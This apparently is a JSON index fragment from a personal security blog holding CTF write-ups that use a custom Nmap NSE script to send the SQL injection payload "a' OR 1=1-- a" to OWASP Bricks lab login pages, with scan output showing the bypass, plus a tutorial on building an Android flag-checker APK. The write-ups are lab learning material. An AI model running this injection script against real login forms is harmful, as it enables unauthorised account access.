, result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 3"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 2 is just a simple SQL injection which javascript validation. Since we are using Nmap NSE to perform SQL injection, it will ignore javascript as it is front end validation. We can use the same NSE script as previous challenge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-2/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall2.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 19:52 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00013s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | submit: Submit | passwd: test | username: a\u0026#39; OR 1=1-- a | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;test\u0026#39; |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-2/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 2 is just a simple SQL injection which javascript validation. Since we are using Nmap NSE to perform SQL injection, it will ignore javascript as it is front end validation. We can use the same NSE script as previous challenge.\u003c/p\u003e","title":"Bricks Login 2"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 1 is just a simple SQL injection. The hardest part is writing a custom NSE script.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-1/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall1.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 19:52 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00013s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | submit: Submit | passwd: test | username: a\u0026#39; OR 1=1-- a | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;test\u0026#39; |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-1/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 1 is just a simple SQL injection. The hardest part is writing a custom NSE script.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-1/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 1"},{"content":"Overview about the journey I have 0 knowledge about kotlin as well as creating Android APK. Most of the things that I mentioned below is also my first time.\nPART 0 Here\u0026rsquo;s the part where I started out by exploring how to create an Android APK. Basically just tons of youtube vidoes and blogs. The final decision? I just go with Android Studio. The installation is simple but remember to download system image for Virtual Device which is also a part of Android Studio.\nPART 1 Here\u0026rsquo;s the part where I tried the classic \u0026ldquo;hello world\u0026rdquo; in kotlin. It took me some times to understand how it works but learning \u0026ldquo;hello world\u0026rdquo; is useless as I wanted to create an APK that accepts input and check the input after clicking the button. So there\u0026rsquo;s goes another round of youtubes and blogs. The conclusion of this is just keep copy other people\u0026rsquo;s code to understand more about the code.\nHere\u0026rsquo;s something crucial before you move on to the next part if you wanna copy my code, if you paste the code and some of the code turn red, just right click and import whatever its needed. It works 99% of the times.\nPART 2 Here\u0026rsquo;s the part where I\u0026rsquo;ll explain abit of the code that I copy wrote. Lets start with MainAcitiviy.kt, this is the main file where most of the code will be written in a single program since I\u0026rsquo;m writing it for the first time.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) enableEdgeToEdge() setContent { Shroomish_Flag_CheckerTheme { Scaffold( modifier = Modifier.fillMaxSize() ) { innerPadding -\u0026gt; CustomA( modifier = Modifier.padding(innerPadding) ) } } } } } Most of the code in this section is auto-generated. I modified slightly to change the default function into my own function CustomA. As for modifier, you can just think of controlling the behaviour of the function.\n1 2 3 4 @Composable fun CustomA( modifier: Modifier = Modifier) { ... } As I mentioned previously, I created my own function CustomA. A parameter of modifier is required in order to match the innerPadding. Inside the function, I started by including an image as my APK background.\n1 2 Image(painter = painterResource(id = R.drawable.shroomish), contentDescription = null , modifier = modifier.fillMaxSize() ) To do so, go to Resource Manager and Import Drawables. Then just select the images and remain everything as default. After importing the images, you could just use R.drawable.\u0026lt;your-image-name\u0026gt; to retrieve the images.\n1 2 3 4 5 Column(modifier = Modifier.fillMaxSize(), verticalArrangement = Arrangement.Bottom, horizontalAlignment = Alignment.CenterHorizontally){ ... } The next section is Column, which basically arranges everything in vertical sequence. The modifier is just trying to make it center and put it at bottom.\n1 2 3 4 5 6 7 8 9 var a by remember { mutableStateOf(\u0026#34;\u0026#34;) } OutlinedTextField( value = a, onValueChange = { a = it }, label = { Text(\u0026#34;Flag check\u0026#34;) }, shape = RoundedCornerShape(20.dp), modifier = modifier .fillMaxWidth().background(color = Color.White,shape = RoundedCornerShape(20.dp)) ) This section is where I created a text field. Basically the final value will be stored inside a and remaining it just trying to beautify the text field.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 val wee = LocalContext.current.applicationContext Button(onClick = { if(wee().eee(wee().ed(a))){ Toast.makeText(wee, \u0026#34;Correct Flag\u0026#34;, Toast.LENGTH_SHORT).show() } else { Toast.makeText(wee, \u0026#34;Nope\u0026#34;, Toast.LENGTH_SHORT).show() } }, colors = ButtonDefaults.buttonColors(Color.Black), shape = RoundedCornerShape(20.dp), contentPadding = PaddingValues(start=60.dp, end=60.dp,top=8.dp, bottom=8.dp), modifier = modifier.padding(bottom=200.dp) ){ Text(text = \u0026#34;Check Flag\u0026#34;, fontSize = 22.sp, color = Color.White) } This section is the button of the APK. the first line wee variable is actually used for the \u0026ldquo;pop up message\u0026rdquo; in the APK. As written in the code, it will trigger an if-else statement and there will be a message popped if the button was clicked. The remaining of the code is just to beautify the button.\nHere\u0026rsquo;s an overall outcome of the APK:\nWhile it\u0026rsquo;s kind of ugly, it works so lets just move on from there.\nPART 3 If you really read everything, you will probably think that why I did not explain the if-else statement in the button. Thats because it\u0026rsquo;s for PART 3. If you looks closely, you will think that what\u0026rsquo;s wee().eee(wee().ed(a)). Basically, wee() is a class which is stated in another file. Kotlin have this feature where you could just declare the class in any file and still use it on other files without the need of importing it. here\u0026rsquo;s the following code for wee() class.\n1 2 3 4 5 6 7 8 9 class wee { init { System.loadLibrary(\u0026#34;shroomish_flag_checker\u0026#34;) System.loadLibrary(\u0026#34;whatsfun\u0026#34;) } external fun eee(input: String): Boolean external fun ed(input: String): String } This is just a simple class that load\u0026rsquo;s 2 libraries and make the functions available to public. So what libraries are those ? it\u0026rsquo;s actually my own custom library that requires C++.\nPART 4 Here\u0026rsquo;s the part where I\u0026rsquo;ll explain briefly on how you could write C++ and use it in Android APK. To make this work, you will need to go to Tools \u0026gt; SDK Manager \u0026gt; Languages \u0026amp; Frameworks \u0026gt; Android SDK \u0026gt; SDK Tools \u0026gt; **tick** NDK and CMake and press OK to install the needed tools.\nAfter the tools are installed, right click on the app and click Add C++ into Module and just click ok with the default option.\nAfter that, you should get your own C++ files that has alot of comments in it. Just remove it and replace with this.\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;jni.h\u0026gt; #include \u0026lt;string\u0026gt; extern \u0026#34;C\u0026#34; JNIEXPORT jstring JNICALL Java_com_example_shroomish_1flag_1checker_wee_ed(JNIEnv* env, jobject /* this */, jstring input) { const char* inputCStr = env-\u0026gt;GetStringUTFChars(input, nullptr); std::string g = std::string(inputCStr); env-\u0026gt;ReleaseStringUTFChars(input, inputCStr); return env-\u0026gt;NewStringUTF(g.c_str()); } The important part of this code is the Java_com_example_shroomish_1flag_1checker_wee_ed. You will need to change it to Java_com_example_\u0026lt;yourproject\u0026gt;_\u0026lt;filename\u0026gt;_\u0026lt;functionname\u0026gt;. Aside from that, most of it are kind of important but you dont really need to know expect that the g is where your input will goes and return will return your strings.\nthis C++ code only returns strings. If you want to return another data type, EXPLORE YOURSELF\nFINAL PART I actually did not explain my own code nor published it in this blog. If you really want to look into my C++ code, you could just go to my github and I have upload the whole project there. While I did not mention chatgpt, it actually helps a lot cause C++ is another nightmare. For those that want to try my challenge, I have uploaded the APK as well.\nReferences My Android Project My Android APK Useful YT video for developing the UI Android Documentation on adding C++ code ","permalink":"https://callmeks.github.io/posts/journey-of-creating-android-ctf/","summary":"\u003ch2 id=\"overview-about-the-journey\"\u003eOverview about the journey\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI have 0 knowledge about kotlin as well as creating Android APK. Most of the things that I mentioned below is also my first time.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"part-0\"\u003ePART 0\u003c/h2\u003e\n\u003cp\u003eHere\u0026rsquo;s the part where I started out by exploring how to create an Android APK. Basically just tons of youtube vidoes and blogs. The final decision? I just go with Android Studio. The installation is simple but remember to download system image for Virtual Device which is also a part of Android Studio.\u003c/p\u003e","title":"Journey of Creating Android CTF"}]